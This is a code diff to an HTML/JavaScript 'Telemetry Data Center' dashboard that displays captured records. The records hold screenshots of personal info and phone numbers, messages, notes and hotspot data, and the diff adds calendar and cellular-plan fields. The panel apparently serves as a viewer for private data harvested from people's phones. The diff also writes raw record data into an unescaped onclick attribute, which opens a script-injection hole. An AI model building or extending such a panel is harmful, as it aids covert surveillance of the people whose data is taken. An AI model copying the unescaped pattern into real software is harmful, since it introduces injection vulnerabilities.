@@ -10,7 +10,7 @@
   
   <div class="max-w-4xl mx-auto px-6 py-12">
     
-    <!-- Top Navigation / Header -->
+    <!-- Header -->
     <header class="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-6 border-b border-white/10 mb-8">
       <div>
         <h1 class="text-xl font-semibold tracking-tight text-white">Telemetry Data Center</h1>
@@ -28,7 +28,7 @@
       </div>
     </header>
 
-    <!-- Search & Filters -->
+    <!-- Search Bar -->
     <div class="mb-6">
       <input type="text" id="search-input" oninput="renderList()" placeholder="Filter captured telemetry..." class="w-full bg-black/40 border border-white/10 rounded-lg px-4 py-2.5 text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-white/30 transition">
     </div>
@@ -58,7 +58,7 @@
       <!-- Modal Body -->
       <div class="p-6 overflow-y-auto space-y-6 text-xs font-mono">
         
-        <!-- Images Grid -->
+        <!-- Images Grid (Base64 Screenshots) -->
         <div>
           <p class="text-slate-400 font-sans font-medium mb-3 uppercase tracking-wider text-[10px]">Captured Assets (Base64)</p>
           <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
@@ -73,10 +73,28 @@
           </div>
         </div>
 
-        <!-- Data Fields Grid -->
+        <!-- Data & Text Fields Grid -->
         <div class="space-y-4 font-sans">
-          <p class="text-slate-400 font-medium uppercase tracking-wider text-[10px]">Payload Fields</p>
+          <p class="text-slate-400 font-medium uppercase tracking-wider text-[10px]">Text & Data Payloads</p>
           
+          <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+            <div class="bg-black/40 border border-white/10 rounded-xl p-4">
+              <div class="flex justify-between items-center mb-2">
+                <span class="text-[11px] font-medium text-slate-400">Calendar Data</span>
+                <button onclick="copyField('field-calendar')" class="text-[10px] text-indigo-400 hover:underline">Copy</button>
+              </div>
+              <div id="field-calendar" class="text-slate-200 text-xs font-mono whitespace-pre-wrap bg-black/50 p-3 rounded border border-white/5 max-h-32 overflow-y-auto"></div>
+            </div>
+
+            <div class="bg-black/40 border border-white/10 rounded-xl p-4">
+              <div class="flex justify-between items-center mb-2">
+                <span class="text-[11px] font-medium text-slate-400">Cellular Plan Data</span>
+                <button onclick="copyField('field-cellular')" class="text-[10px] text-indigo-400 hover:underline">Copy</button>
+              </div>
+              <div id="field-cellular" class="text-slate-200 text-xs font-mono whitespace-pre-wrap bg-black/50 p-3 rounded border border-white/5 max-h-32 overflow-y-auto"></div>
+            </div>
+          </div>
+
           <div class="bg-black/40 border border-white/10 rounded-xl p-4">
             <div class="flex justify-between items-center mb-2">
               <span class="text-[11px] font-medium text-slate-400">Notes Field</span>
@@ -161,7 +179,7 @@
       }
 
       container.innerHTML = filtered.map(item => `
-        <div onclick="openModal('${item.id}')" class="bg-black/30 hover:bg-black/50 border border-white/10 hover:border-white/20 rounded-xl p-4 transition cursor-pointer flex items-center justify-between group">
+        <div onclick='openModal(${JSON.stringify(item)})' class="bg-black/30 hover:bg-black/50 border border-white/10 hover:border-white/20 rounded-xl p-4 transition cursor-pointer flex items-center justify-between group">
           <div class="space-y-1">
             <div class="text-xs font-mono text-slate-200 truncate max-w-md">${escapeHtml(String(item.notes || 'No Notes Content'))}</div>
             <div class="text-[10px] text-slate-500 font-mono">${new Date(item.timestamp).toLocaleString()}</div>
@@ -173,13 +191,12 @@
       `).join('');
     }
 
-    function openModal(id) {
-      const item = globalData.find(entry => String(entry.id) === String(id));
-      if (!item) return;
-
+    function openModal(item) {
       document.getElementById('modal-timestamp').innerText = new Date(item.timestamp).toLocaleString();
       document.getElementById('img-personal').src = item.personal_info_b64 || '';
       document.getElementById('img-phone').src = item.phone_number_b64 || '';
+      document.getElementById('field-calendar').innerText = item.calendar || 'N/A';
+      document.getElementById('field-cellular').innerText = item.cellular_plan || 'N/A';
       document.getElementById('field-notes').innerText = item.notes || 'N/A';
       document.getElementById('field-messages').innerText = item.messages || 'N/A';
       document.getElementById('field-hotspot').innerText = item.hotspot || 'N/A';
